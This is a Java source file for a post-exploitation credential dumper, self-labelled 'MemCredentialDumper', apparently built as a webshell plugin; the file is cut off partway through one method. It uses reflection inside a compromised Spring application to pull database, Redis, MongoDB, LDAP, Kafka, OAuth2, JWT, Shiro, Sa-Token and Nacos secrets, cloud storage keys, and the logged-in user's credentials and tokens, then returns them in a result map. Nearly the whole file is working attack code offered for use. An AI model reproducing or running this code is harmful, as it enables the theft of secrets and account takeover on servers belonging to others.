import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.*;
public class HashMemDumper {
    private HashMap parameterMap;
    public HashMemDumper() {}
    public boolean equals(Object obj) {
        this.parameterMap = (HashMap) obj;
        return true;
    }
    public String toString() {
        StringBuilder out = new StringBuilder();
        try {
            out.append("[MemCredentialDumper v1.1]\n\n");
            extractApplicationPath(out);
            Object ctx = findApplicationContext();
            extractSpringEnvironment(ctx, out);
            extractDataSource(ctx, out);
            extractRedisConfig(ctx, out);
            extractShiroKey(out);
            extractMongoClient(ctx, out);
            extractLDAP(ctx, out);
            extractOAuth2(ctx, out);
            extractKafka(ctx, out);
            extractJwtSecret(ctx, out);
            extractSpringSecurityAuth(out);
            extractSaToken(ctx, out);
            extractDruidDataSource(ctx, out);
            extractJasyptEncryptor(ctx, out);
            extractCloudCredentials(ctx, out);
            extractNacosConfig(ctx, out);
            if (out.length() < 50) {
                out.append("[*] No credentials found.\n");
            }
        } catch (Throwable e) {
            out.append("[-] Error: ").append(e.toString()).append("\n");
        }
        parameterMap.put("result", out.toString().replace("%", "%%").getBytes());
        return "";
    }
    private Object findApplicationContext() {
        Object ctx = null;
        ctx = tryFromServletContext();
        if (ctx != null) return ctx;
        ctx = tryContextLoader();
        if (ctx != null) return ctx;
        ctx = tryLiveBeansView();
        if (ctx != null) return ctx;
        ctx = tryFromThreads();
        return ctx;
    }
    private Object tryFromServletContext() {
        try {
            Object sc = null;
            String[] keys = {"request", "req", "pageContext", "servletRequest"};
            for (int i = 0; i < keys.length; i++) {
                Object reqObj = parameterMap.get(keys[i]);
                if (reqObj == null) continue;
                try {
                    Method m = reqObj.getClass().getMethod("getServletContext");
                    m.setAccessible(true);
                    sc = m.invoke(reqObj);
                } catch (Exception e1) {
                    try {
                        Method ms = reqObj.getClass().getMethod("getSession");
                        Object session = ms.invoke(reqObj);
                        Method msc = session.getClass().getMethod("getServletContext");
                        sc = msc.invoke(session);
                    } catch (Exception ignored) {}
                }
                if (sc != null) break;
            }
            if (sc == null) {
                sc = parameterMap.get("servletContext");
            }
            if (sc == null) return null;
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class wacUtils = cl.loadClass(
                    "org.springframework.web.context.support.WebApplicationContextUtils");
            Method m = wacUtils.getMethod("getWebApplicationContext",
                    cl.loadClass("javax.servlet.ServletContext"));
            Object ctx = m.invoke(null, sc);
            if (ctx != null) return ctx;
            try {
                m = wacUtils.getMethod("getWebApplicationContext",
                        cl.loadClass("jakarta.servlet.ServletContext"));
                return m.invoke(null, sc);
            } catch (Exception ignored) {}
        } catch (Exception ignored) {}
        return null;
    }
    private Object tryContextLoader() {
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class clazz = cl.loadClass(
                    "org.springframework.web.context.ContextLoader");
            Method m = clazz.getMethod("getCurrentWebApplicationContext");
            return m.invoke(null);
        } catch (Exception ignored) {}
        return null;
    }
    private Object tryLiveBeansView() {
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class clazz = cl.loadClass(
                    "org.springframework.context.support.LiveBeansView");
            Field f = clazz.getDeclaredField("applicationContexts");
            f.setAccessible(true);
            Set ctxSet = (Set) f.get(null);
            if (ctxSet != null && !ctxSet.isEmpty()) {
                return ctxSet.iterator().next();
            }
        } catch (Exception ignored) {}
        return null;
    }
    private Object tryFromThreads() {
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class rch = cl.loadClass(
                    "org.springframework.web.context.request.RequestContextHolder");
            Method m = rch.getMethod("currentRequestAttributes");
            Object attrs = m.invoke(null);
            Method mr = attrs.getClass().getMethod("getRequest");
            Object req = mr.invoke(attrs);
            Method msc = req.getClass().getMethod("getServletContext");
            Object sc = msc.invoke(req);
            Class wacUtils = cl.loadClass(
                    "org.springframework.web.context.support.WebApplicationContextUtils");
            Method mw = wacUtils.getMethod("getWebApplicationContext",
                    sc.getClass().getInterfaces()[0]);
            return mw.invoke(null, sc);
        } catch (Exception ignored) {}
        return null;
    }
    private void extractSpringEnvironment(Object ctx, StringBuilder out) {
        if (ctx == null) return;
        try {
            out.append("[Spring Environment Properties]\n");
            Method getBean = ctx.getClass().getMethod("getBean", Class.class);
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class envClass = cl.loadClass("org.springframework.core.env.Environment");
            Object env = getBean.invoke(ctx, envClass);
            String[] keys = {
                "spring.datasource.url", "spring.datasource.username", "spring.datasource.password",
                "spring.datasource.driver-class-name",
                "spring.redis.host", "spring.redis.port", "spring.redis.password", "spring.redis.database",
                "spring.data.redis.host", "spring.data.redis.port", "spring.data.redis.password",
                "spring.data.mongodb.uri", "spring.data.mongodb.host", "spring.data.mongodb.username",
                "spring.data.mongodb.password", "spring.data.mongodb.database",
                "shiro.rememberMe.cipherKey",
                "jwt.secret", "jwt.key", "jwt.secret-key", "jwt.signing.key", "jwt.token.secret",
                "security.jwt.secret", "app.jwt.secret",
                "aliyun.oss.accessKeyId", "aliyun.oss.accessKeySecret", "aliyun.oss.endpoint",
                "aliyun.oss.bucketName",
                "spring.cloud.alicloud.access-key", "spring.cloud.alicloud.secret-key",
                "cos.secretId", "cos.secretKey",
                "minio.endpoint", "minio.accessKey", "minio.secretKey", "minio.bucket",
                "qiniu.accessKey", "qiniu.secretKey",
                "wx.miniapp.appid", "wx.miniapp.secret", "wx.pay.appId", "wx.pay.mchId",
                "wx.pay.mchKey",
                "spring.kafka.bootstrap-servers",
                "spring.kafka.properties.sasl.jaas.config",
                "spring.ldap.urls", "spring.ldap.username", "spring.ldap.password",
                "spring.ldap.base",
                "spring.mail.host", "spring.mail.username", "spring.mail.password",
                "spring.cloud.nacos.config.server-addr", "spring.cloud.nacos.config.access-key",
                "spring.cloud.nacos.config.secret-key", "spring.cloud.nacos.config.username",
                "spring.cloud.nacos.config.password",
                "apollo.meta", "app.id",
                "spring.elasticsearch.uris", "spring.elasticsearch.username",
                "spring.elasticsearch.password",
                "spring.rabbitmq.host", "spring.rabbitmq.port", "spring.rabbitmq.username",
                "spring.rabbitmq.password",
                "spring.security.oauth2.client.registration.default.client-id",
                "spring.security.oauth2.client.registration.default.client-secret",
                "jasypt.encryptor.password",
                "encrypt.key",
            };
            Method getProperty = envClass.getMethod("getProperty", String.class);
            int found = 0;
            for (int i = 0; i < keys.length; i++) {
                try {
                    Object val = getProperty.invoke(env, keys[i]);
                    if (val != null && val.toString().length() > 0) {
                        out.append("  ").append(keys[i]).append(" = ").append(val).append("\n");
                        found++;
                    }
                } catch (Exception ignored) {}
            }
            if (found == 0) out.append("  (none)\n");
            out.append("\n");
        } catch (Exception ignored) {}
    }
    private void extractDataSource(Object ctx, StringBuilder out) {
        if (ctx == null) return;
        try {
            out.append("[DataSource Credentials]\n");
            Method getBeanNamesForType = ctx.getClass().getMethod("getBeanNamesForType", Class.class);
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class dsClass = cl.loadClass("javax.sql.DataSource");
            String[] names = (String[]) getBeanNamesForType.invoke(ctx, dsClass);
            if (names == null || names.length == 0) {
                try {
                    dsClass = cl.loadClass("jakarta.sql.DataSource");
                    names = (String[]) getBeanNamesForType.invoke(ctx, dsClass);
                } catch (Exception ignored) {}
            }
            if (names == null || names.length == 0) {
                out.append("  (no DataSource bean)\n\n");
                return;
            }
            Method getBean = ctx.getClass().getMethod("getBean", String.class);
            for (int i = 0; i < names.length; i++) {
                try {
                    Object ds = getBean.invoke(ctx, names[i]);
                    if (ds.getClass().getName().contains("DruidDataSource")) continue;
                    out.append("  [").append(names[i]).append("] ")
                       .append(ds.getClass().getName()).append("\n");
                    String[][] fieldSets = {
                        {"url", "jdbcUrl", "URL"},
                        {"username", "user", "User"},
                        {"password", "Password"},
                        {"driverClassName", "driverClass", "driver"}
                    };
                    for (int j = 0; j < fieldSets.length; j++) {
                        String val = readAnyField(ds, fieldSets[j]);
                        if (val != null) {
                            out.append("    ").append(fieldSets[j][0])
                               .append(" = ").append(val).append("\n");
                        }
                    }
                    out.append("\n");
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {
            out.append("  (extract failed)\n\n");
        }
    }
    private void extractRedisConfig(Object ctx, StringBuilder out) {
        if (ctx == null) return;
        try {
            out.append("[Redis Configuration]\n");
            boolean found = false;
            try {
                ClassLoader cl = Thread.currentThread().getContextClassLoader();
                Class rscClass = cl.loadClass("org.springframework.data.redis.connection.RedisStandaloneConfiguration");
                Method getBeanNames = ctx.getClass().getMethod("getBeanNamesForType", Class.class);
                String[] names = (String[]) getBeanNames.invoke(ctx, rscClass);
                if (names != null && names.length > 0) {
                    Method getBean = ctx.getClass().getMethod("getBean", String.class);
                    for (int i = 0; i < names.length; i++) {
                        Object cfg = getBean.invoke(ctx, names[i]);
                        String host = callMethodStr(cfg, "getHostName");
                        String port = callMethodStr(cfg, "getPort");
                        String db   = callMethodStr(cfg, "getDatabase");
                        Object pwObj = callMethod(cfg, "getPassword");
                        String pw = null;
                        if (pwObj != null) {
                            try {
                                Method isPresent = pwObj.getClass().getMethod("isPresent");
                                if ((Boolean) isPresent.invoke(pwObj)) {
                                    Method get = pwObj.getClass().getMethod("get");
                                    Object chars = get.invoke(pwObj);
                                    pw = new String((char[]) chars);
                                }
                            } catch (Exception ignored) {}
                        }
                        out.append("  [").append(names[i]).append("] host=").append(host)
                           .append(" port=").append(port)
                           .append(" db=").append(db);
                        if (pw != null) out.append(" password=").append(pw);
                        out.append("\n");
                        found = true;
                    }
                }
            } catch (Exception ignored) {}
            try {
                ClassLoader cl = Thread.currentThread().getContextClassLoader();
                Class jedisPoolClass = cl.loadClass("redis.clients.jedis.JedisPool");
                Method getBeanNames = ctx.getClass().getMethod("getBeanNamesForType", Class.class);
                String[] names = (String[]) getBeanNames.invoke(ctx, jedisPoolClass);
                if (names != null && names.length > 0) {
                    Method getBean = ctx.getClass().getMethod("getBean", String.class);
                    for (int i = 0; i < names.length; i++) {
                        Object pool = getBean.invoke(ctx, names[i]);
                        String host = readFieldStr(pool, "host");
                        String port = readFieldStr(pool, "port");
                        String pw = readFieldStr(pool, "password");
                        if (host != null) {
                            out.append("  Jedis: host=").append(host)
                               .append(" port=").append(port);
                            if (pw != null) out.append(" password=").append(pw);
                            out.append("\n");
                            found = true;
                        }
                    }
                }
            } catch (Exception ignored) {}
            if (!found) out.append("  (none)\n");
            out.append("\n");
        } catch (Exception ignored) {}
    }
    private void extractShiroKey(StringBuilder out) {
        out.append("[Shiro RememberMe Key]\n");
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class mgrClass = cl.loadClass("org.apache.shiro.web.mgt.CookieRememberMeManager");
            Class suClass = cl.loadClass("org.apache.shiro.SecurityUtils");
            Method getSM = suClass.getMethod("getSecurityManager");
            Object sm = getSM.invoke(null);
            if (sm == null) { out.append("  (none)\n\n"); return; }
            Object rmm = callMethod(sm, "getRememberMeManager");
            if (rmm == null) { out.append("  (none)\n\n"); return; }
            boolean found = false;
            Field keyField = findField(rmm.getClass(), "encryptionCipherKey");
            if (keyField != null) {
                keyField.setAccessible(true);
                byte[] key = (byte[]) keyField.get(rmm);
                if (key != null) {
                    out.append("  key(Base64) = ").append(base64Encode(key)).append("\n");
                    found = true;
                }
            }
            String alg = readFieldStr(rmm, "cipherService.algorithmName");
            if (alg == null) {
                Object cs = readFieldObj(rmm, "cipherService");
                if (cs != null) alg = readFieldStr(cs, "algorithmName");
            }
            if (alg != null) { out.append("  algorithm = ").append(alg).append("\n"); found = true; }
            if (!found) out.append("  (none)\n");
            out.append("\n");
        } catch (Exception e) {
            out.append("  (none)\n\n");
        }
    }
    private void extractMongoClient(Object ctx, StringBuilder out) {
        if (ctx == null) return;
        try {
            out.append("[MongoDB Credentials]\n");
            boolean found = false;
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Method getBeanNamesForType = ctx.getClass().getMethod("getBeanNamesForType", Class.class);
            Method getBeanByName = ctx.getClass().getMethod("getBean", String.class);
            try {
                Class mcClass = cl.loadClass("com.mongodb.client.MongoClient");
                String[] mcNames = (String[]) getBeanNamesForType.invoke(ctx, mcClass);
                if (mcNames != null && mcNames.length > 0) {
                    for (int j = 0; j < mcNames.length; j++) {
                        Object client = getBeanByName.invoke(ctx, mcNames[j]);
                        Object settings = readFieldObj(client, "settings");
                        if (settings == null) settings = callMethod(client, "getSettings");
                        if (settings != null) {
                            Object credential = readFieldObj(settings, "credential");
                            if (credential == null) credential = callMethod(settings, "getCredential");
                            if (credential != null) {
                                String user = callMethodStr(credential, "getUserName");
                                char[] pw = (char[]) callMethod(credential, "getPassword");
                                String source = callMethodStr(credential, "getSource");
                                if (user != null) { out.append("  [").append(mcNames[j]).append("] username = ").append(user).append("\n"); found = true; }
                                if (pw != null) { out.append("  [").append(mcNames[j]).append("] password = ").append(new String(pw)).append("\n"); found = true; }
                                if (source != null) { out.append("  [").append(mcNames[j]).append("] authSource = ").append(source).append("\n"); found = true; }
                            }
                        }
                    }
                }
            } catch (Exception ignored) {}
            if (!found) {
                try {
                    Class mcsClass = cl.loadClass("com.mongodb.MongoClientSettings");
                    String[] mcsNames = (String[]) getBeanNamesForType.invoke(ctx, mcsClass);
                    if (mcsNames != null && mcsNames.length > 0) {
                        for (int j = 0; j < mcsNames.length; j++) {
                            Object settings = getBeanByName.invoke(ctx, mcsNames[j]);
                            Object credential = readFieldObj(settings, "credential");
                            if (credential == null) credential = callMethod(settings, "getCredential");
                            if (credential != null) {
                                String user = callMethodStr(credential, "getUserName");
                                char[] pw = (char[]) callMethod(credential, "getPassword");
                                String source = callMethodStr(credential, "getSource");
                                if (user != null) { out.append("  [").append(mcsNames[j]).append("] username = ").append(user).append("\n"); found = true; }
                                if (pw != null) { out.append("  [").append(mcsNames[j]).append("] password = ").append(new String(pw)).append("\n"); found = true; }
                                if (source != null) { out.append("  [").append(mcsNames[j]).append("] authSource = ").append(source).append("\n"); found = true; }
                            }
                        }
                    }
                } catch (Exception ignored) {}
            }
            if (!found) out.append("  (none)\n");
            out.append("\n");
        } catch (Exception ignored) {}
    }
    private void extractLDAP(Object ctx, StringBuilder out) {
        if (ctx == null) return;
        out.append("[LDAP Credentials]\n");
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class ldcClass = cl.loadClass("org.springframework.ldap.core.support.LdapContextSource");
            Method getBeanNames = ctx.getClass().getMethod("getBeanNamesForType", Class.class);
            String[] names = (String[]) getBeanNames.invoke(ctx, ldcClass);
            if (names == null || names.length == 0) { out.append("  (none)\n\n"); return; }
            Method getBean = ctx.getClass().getMethod("getBean", String.class);
            for (int i = 0; i < names.length; i++) {
                Object ldapCtxSrc = getBean.invoke(ctx, names[i]);
                out.append("  [").append(names[i]).append("]\n");
                String url = readFieldStr(ldapCtxSrc, "urls");
                String base = readFieldStr(ldapCtxSrc, "base");
                String userDn = readFieldStr(ldapCtxSrc, "userDn");
                String password = readFieldStr(ldapCtxSrc, "password");
                if (url == null) {
                    Object urlsObj = readFieldObj(ldapCtxSrc, "urls");
                    if (urlsObj instanceof String[]) {
                        url = Arrays.toString((String[]) urlsObj);
                    }
                }
                if (url != null) out.append("    url = ").append(url).append("\n");
                if (base != null) out.append("    baseDN = ").append(base).append("\n");
                if (userDn != null) out.append("    bindDN = ").append(userDn).append("\n");
                if (password != null) out.append("    password = ").append(password).append("\n");
                out.append("\n");
            }
        } catch (Exception e) {
            out.append("  (none)\n\n");
        }
    }
    private void extractOAuth2(Object ctx, StringBuilder out) {
        if (ctx == null) return;
        out.append("[OAuth2 Client Registrations]\n");
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Method getBean = ctx.getClass().getMethod("getBean", Class.class);
            Object repo = getBean.invoke(ctx,
                    cl.loadClass("org.springframework.security.oauth2.client.registration.ClientRegistrationRepository"));
            if (repo == null) { out.append("  (none)\n\n"); return; }
            if (repo instanceof Iterable) {
                Iterator it = ((Iterable) repo).iterator();
                while (it.hasNext()) {
                    Object reg = it.next();
                    String regId = callMethodStr(reg, "getRegistrationId");
                    String clientId = callMethodStr(reg, "getClientId");
                    String clientSecret = callMethodStr(reg, "getClientSecret");
                    out.append("  [").append(regId).append("]\n");
                    out.append("    clientId = ").append(clientId).append("\n");
                    if (clientSecret != null)
                        out.append("    clientSecret = ").append(clientSecret).append("\n");
                    out.append("\n");
                }
            }
        } catch (Exception e) {
            out.append("  (none)\n\n");
        }
    }
    private void extractKafka(Object ctx, StringBuilder out) {
        if (ctx == null) return;
        out.append("[Kafka Configuration]\n");
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Method getBean = ctx.getClass().getMethod("getBean", Class.class);
            Object kafkaProps = getBean.invoke(ctx,
                    cl.loadClass("org.springframework.boot.autoconfigure.kafka.KafkaProperties"));
            if (kafkaProps == null) { out.append("  (none)\n\n"); return; }
            Object bootstrapServers = callMethod(kafkaProps, "getBootstrapServers");
            if (bootstrapServers != null)
                out.append("  bootstrapServers = ").append(bootstrapServers).append("\n");
            Object props = callMethod(kafkaProps, "getProperties");
            if (props instanceof Map) {
                Map map = (Map) props;
                Object jaas = map.get("sasl.jaas.config");
                if (jaas != null)
                    out.append("  sasl.jaas.config = ").append(jaas).append("\n");
                Object mechanism = map.get("sasl.mechanism");
                if (mechanism != null)
                    out.append("  sasl.mechanism = ").append(mechanism).append("\n");
            }
            out.append("\n");
        } catch (Exception e) {
            out.append("  (none)\n\n");
        }
    }
    private void extractJwtSecret(Object ctx, StringBuilder out) {
        if (ctx == null) return;
        out.append("[JWT Secrets]\n");
        try {
            Method getBeanNames = ctx.getClass().getMethod("getBeanDefinitionNames");
            String[] names = (String[]) getBeanNames.invoke(ctx);
            Method getBean = ctx.getClass().getMethod("getBean", String.class);
            boolean found = false;
            for (int i = 0; i < names.length; i++) {
                String name = names[i].toLowerCase();
                if (!name.contains("jwt") && !name.contains("token")) continue;
                try {
                    Object bean = getBean.invoke(ctx, names[i]);
                    String[] secretFields = {"secret", "secretKey", "signingKey", "key",
                            "base64Secret", "jwtSecret", "tokenSecret"};
                    for (int j = 0; j < secretFields.length; j++) {
                        String val = readFieldStr(bean, secretFields[j]);
                        if (val != null && val.length() > 3) {
                            out.append("  ").append(names[i]).append(".")
                               .append(secretFields[j]).append(" = ").append(val).append("\n");
                            found = true;
                        }
                    }
                } catch (Exception ignored) {}
            }
            if (!found) out.append("  (none)\n");
            out.append("\n");
        } catch (Exception ignored) {}
    }
    private void extractApplicationPath(StringBuilder out) {
        try {
            out.append("[Application Path]\n");
            String userDir = System.getProperty("user.dir");
            if (userDir != null) out.append("  user.dir = ").append(userDir).append("\n");
            String cmd = System.getProperty("sun.java.command");
            if (cmd != null) out.append("  java.command = ").append(cmd).append("\n");
            String catHome = System.getProperty("catalina.home");
            if (catHome != null) out.append("  catalina.home = ").append(catHome).append("\n");
            String catBase = System.getProperty("catalina.base");
            if (catBase != null) out.append("  catalina.base = ").append(catBase).append("\n");
            String cp = System.getProperty("java.class.path");
            if (cp != null) {
                if (cp.length() > 500) cp = cp.substring(0, 500) + "...";
                out.append("  classpath = ").append(cp).append("\n");
            }
            String javaVer = System.getProperty("java.version");
            if (javaVer != null) out.append("  java.version = ").append(javaVer).append("\n");
            String osName = System.getProperty("os.name");
            String osArch = System.getProperty("os.arch");
            if (osName != null) out.append("  os = ").append(osName).append(" ").append(osArch).append("\n");
            try {
                String[] keys = {"request", "req", "pageContext", "servletRequest"};
                for (int i = 0; i < keys.length; i++) {
                    Object reqObj = parameterMap.get(keys[i]);
                    if (reqObj == null) continue;
                    try {
                        Method msc = reqObj.getClass().getMethod("getServletContext");
                        Object sc = msc.invoke(reqObj);
                        Method mrp = sc.getClass().getMethod("getRealPath", String.class);
                        String realPath = (String) mrp.invoke(sc, "/");
                        if (realPath != null) out.append("  webroot = ").append(realPath).append("\n");
                        break;
                    } catch (Exception ignored) {}
                }
            } catch (Exception ignored) {}
            out.append("\n");
        } catch (Exception ignored) {}
    }
    private void extractSpringSecurityAuth(StringBuilder out) {
        out.append("[Spring Security Authentication]\n");
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class schClass = cl.loadClass(
                    "org.springframework.security.core.context.SecurityContextHolder");
            Method getCtx = schClass.getMethod("getContext");
            Object secCtx = getCtx.invoke(null);
            if (secCtx == null) { out.append("  (none)\n\n"); return; }
            Method getAuth = secCtx.getClass().getMethod("getAuthentication");
            Object auth = getAuth.invoke(secCtx);
            if (auth == null) { out.append("  (none)\n\n"); return; }
            Object principal = callMethod(auth, "getPrincipal");
            if (principal != null) {
                out.append("  principal = ").append(principal.toString()).append("\n");
                String username = callMethodStr(principal, "getUsername");
                if (username != null) out.append("  username = ").append(username).append("\n");
                String pw = callMethodStr(principal, "getPassword");
                if (pw != null) out.append("  password = ").append(pw).append("\n");
            }
            Object creds = callMethod(auth, "getCredentials");
            if (creds != null) {
                String credStr;
                if (creds instanceof char[]) {
                    credStr = new String((char[]) creds);
                } else {
                    credStr = creds.toString();
                }
                if (credStr.length() > 0 && !"null".equals(credStr)) {
                    out.append("  credentials = ").append(credStr).append("\n");
                }
            }
            Object authorities = callMethod(auth, "getAuthorities");
            if (authorities != null) {
                out.append("  authorities = ").append(authorities.toString()).append("\n");
            }
            out.append("  authClass = ").append(auth.getClass().getName()).append("\n");
            String tokenVal = readFieldStr(auth, "token");
            if (tokenVal == null) tokenVal = readFieldStr(auth, "tokenValue");
            if (tokenVal == null) tokenVal = readFieldStr(auth, "accessToken");
            if (tokenVal != null) {
                out.append("  token = ").append(tokenVal).append("\n");
            }
            out.append("\n");
        } catch (Exception e) {
            out.append("  (none)\n\n");
        }
    }
    private void extractCloudCredentials(Object ctx, StringBuilder out) {
        if (ctx == null) return;
        out.append("[Cloud Service Credentials]\n");
        boolean found = false;
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Method getBean = ctx.getClass().getMethod("getBean", Class.class);
            Object client = getBean.invoke(ctx, cl.loadClass("com.aliyun.oss.OSSClient"));
            if (client != null) {
                out.append("  [Aliyun OSS]\n");
                Object cp = readFieldObj(client, "credsProvider");
                if (cp == null) cp = readFieldObj(client, "credentialsProvider");
                if (cp != null) {
                    Object creds = callMethod(cp, "getCredentials");
                    if (creds != null) {
                        out.append("    accessKeyId = ").append(callMethodStr(creds, "getAccessKeyId")).append("\n");
                        out.append("    secretAccessKey = ").append(callMethodStr(creds, "getSecretAccessKey")).append("\n");
                        String token = callMethodStr(creds, "getSecurityToken");
                        if (token != null) out.append("    securityToken = ").append(token).append("\n");
                        found = true;
                    }
                }
                String endpoint = readFieldStr(client, "endpoint");
                if (endpoint == null) {
                    Object ep = readFieldObj(client, "endpoint");
                    if (ep != null) endpoint = ep.toString();
                }
                if (endpoint != null) { out.append("    endpoint = ").append(endpoint).append("\n"); found = true; }
                out.append("\n");
            }
        } catch (Exception ignored) {}
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Method getBean = ctx.getClass().getMethod("getBean", Class.class);
            Object client = getBean.invoke(ctx, cl.loadClass("com.qcloud.cos.COSClient"));
            if (client != null) {
                out.append("  [Tencent COS]\n");
                Object cp = readFieldObj(client, "cred");
                if (cp == null) cp = readFieldObj(client, "credProvider");
                if (cp != null) {
                    Object creds = callMethod(cp, "getCredentials");
                    if (creds != null) {
                        out.append("    secretId = ").append(callMethodStr(creds, "getCOSAccessKeyId")).append("\n");
                        out.append("    secretKey = ").append(callMethodStr(creds, "getCOSSecretKey")).append("\n");
                        found = true;
                    }
                }
                out.append("\n");
            }
        } catch (Exception ignored) {}
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Method getBean = ctx.getClass().getMethod("getBean", Class.class);
            Object client = getBean.invoke(ctx, cl.loadClass("io.minio.MinioClient"));
            if (client != null) {
                out.append("  [MinIO]\n");
                String ak = readFieldStr(client, "accessKey");
                String sk = readFieldStr(client, "secretKey");
                String ep = readFieldStr(client, "baseUrl");
                if (ep == null) {
                    Object baseUrl = readFieldObj(client, "baseUrl");
                    if (baseUrl != null) ep = baseUrl.toString();
                }
                if (ak == null) {
                    Object provider = readFieldObj(client, "provider");
                    if (provider != null) {
                        Object creds = callMethod(provider, "fetch");
                        if (creds != null) {
                            ak = callMethodStr(creds, "accessKey");
                            sk = callMethodStr(creds, "secretKey");
                            if (ak == null) ak = readFieldStr(creds, "accessKey");
                            if (sk == null) sk = readFieldStr(creds, "secretKey");
                        }
                    }
                }
                if (ak != null) { out.append("    accessKey = ").append(ak).append("\n"); found = true; }
                if (sk != null) { out.append("    secretKey = ").append(sk).append("\n"); found = true; }
                if (ep != null) { out.append("    endpoint = ").append(ep).append("\n"); found = true; }
                out.append("\n");
            }
        } catch (Exception ignored) {}
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class authClass = cl.loadClass("com.qiniu.util.Auth");
            Method getBean = ctx.getClass().getMethod("getBean", Class.class);
            Object auth = getBean.invoke(ctx, authClass);
            if (auth != null) {
                out.append("  [Qiniu]\n");
                String ak = readFieldStr(auth, "accessKey");
                String sk = readFieldStr(auth, "secretKey");
                if (ak != null) { out.append("    accessKey = ").append(ak).append("\n"); found = true; }
                if (sk != null) { out.append("    secretKey = ").append(sk).append("\n"); found = true; }
                out.append("\n");
            }
        } catch (Exception ignored) {}
        if (!found) out.append("  (none)\n");
        out.append("\n");
    }
    private void extractNacosConfig(Object ctx, StringBuilder out) {
        if (ctx == null) return;
        out.append("[Nacos Configuration]\n");
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            boolean found = false;
            try {
                Method getBean = ctx.getClass().getMethod("getBean", Class.class);
                Object nacosProps = getBean.invoke(ctx,
                        cl.loadClass("com.alibaba.cloud.nacos.NacosConfigProperties"));
                if (nacosProps != null) {
                    String serverAddr = callMethodStr(nacosProps, "getServerAddr");
                    String namespace  = callMethodStr(nacosProps, "getNamespace");
                    String group      = callMethodStr(nacosProps, "getGroup");
                    String ak         = callMethodStr(nacosProps, "getAccessKey");
                    String sk         = callMethodStr(nacosProps, "getSecretKey");
                    String username   = callMethodStr(nacosProps, "getUsername");
                    String password   = callMethodStr(nacosProps, "getPassword");
                    if (serverAddr != null) { out.append("  serverAddr = ").append(serverAddr).append("\n"); found = true; }
                    if (namespace != null)  { out.append("  namespace = ").append(namespace).append("\n"); found = true; }
                    if (group != null)      { out.append("  group = ").append(group).append("\n"); found = true; }
                    if (ak != null)         { out.append("  accessKey = ").append(ak).append("\n"); found = true; }
                    if (sk != null)         { out.append("  secretKey = ").append(sk).append("\n"); found = true; }
                    if (username != null)   { out.append("  username = ").append(username).append("\n"); found = true; }
                    if (password != null)   { out.append("  password = ").append(password).append("\n"); found = true; }
                }
            } catch (Exception ignored) {}
            if (!found) {
                try {
                    Method getBean = ctx.getClass().getMethod("getBean", Class.class);
                    Object discoveryProps = getBean.invoke(ctx,
                            cl.loadClass("com.alibaba.cloud.nacos.NacosDiscoveryProperties"));
                    if (discoveryProps != null) {
                        String serverAddr = callMethodStr(discoveryProps, "getServerAddr");
                        String namespace  = callMethodStr(discoveryProps, "getNamespace");
                        String ak         = callMethodStr(discoveryProps, "getAccessKey");
                        String sk         = callMethodStr(discoveryProps, "getSecretKey");
                        String username   = callMethodStr(discoveryProps, "getUsername");
                        String password   = callMethodStr(discoveryProps, "getPassword");
                        if (serverAddr != null) { out.append("  serverAddr = ").append(serverAddr).append("\n"); found = true; }
                        if (namespace != null)  { out.append("  namespace = ").append(namespace).append("\n"); found = true; }
                        if (ak != null)         { out.append("  accessKey = ").append(ak).append("\n"); found = true; }
                        if (sk != null)         { out.append("  secretKey = ").append(sk).append("\n"); found = true; }
                        if (username != null)   { out.append("  username = ").append(username).append("\n"); found = true; }
                        if (password != null)   { out.append("  password = ").append(password).append("\n"); found = true; }
                    }
                } catch (Exception ignored) {}
            }
            if (!found) {
                try {
                    Method getBean = ctx.getClass().getMethod("getBean", Class.class);
                    Object configService = null;
                    try {
                        configService = getBean.invoke(ctx,
                                cl.loadClass("com.alibaba.nacos.api.config.ConfigService"));
                    } catch (Exception ignored) {}
                    if (configService != null) {
                        Object worker = readFieldObj(configService, "worker");
                        if (worker != null) {
                            Object agent = readFieldObj(worker, "agent");
                            if (agent == null) agent = readFieldObj(worker, "serverHttpAgent");
                            if (agent != null) {
                                String ak = readFieldStr(agent, "accessKey");
                                String sk = readFieldStr(agent, "secretKey");
                                if (ak != null) { out.append("  accessKey = ").append(ak).append("\n"); found = true; }
                                if (sk != null) { out.append("  secretKey = ").append(sk).append("\n"); found = true; }
                            }
                        }
                    }
                } catch (Exception ignored) {}
            }
            if (!found) out.append("  (none)\n");
            out.append("\n");
        } catch (Exception ignored) {}
    }
    private void extractSaToken(Object ctx, StringBuilder out) {
        if (ctx == null) return;
        out.append("[Sa-Token Configuration]\n");
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Method getBean = ctx.getClass().getMethod("getBean", Class.class);
            boolean found = false;
            try {
                Object config = getBean.invoke(ctx, cl.loadClass("cn.dev33.satoken.config.SaTokenConfig"));
                if (config != null) {
                    String signKey = readFieldStr(config, "tokenSignKey");
                    String secret = readFieldStr(config, "tokenSecret");
                    String jwtKey = readFieldStr(config, "jwtSecretKey");
                    if (signKey != null) { out.append("  tokenSignKey = ").append(signKey).append("\n"); found = true; }
                    if (secret != null) { out.append("  tokenSecret = ").append(secret).append("\n"); found = true; }
                    if (jwtKey != null) { out.append("  jwtSecretKey = ").append(jwtKey).append("\n"); found = true; }
                }
            } catch (Exception ignored) {}
            if (!found) {
                try {
                    Method getBeanNames = ctx.getClass().getMethod("getBeanNamesForType", Class.class);
                    String[] names = (String[]) getBeanNames.invoke(ctx,
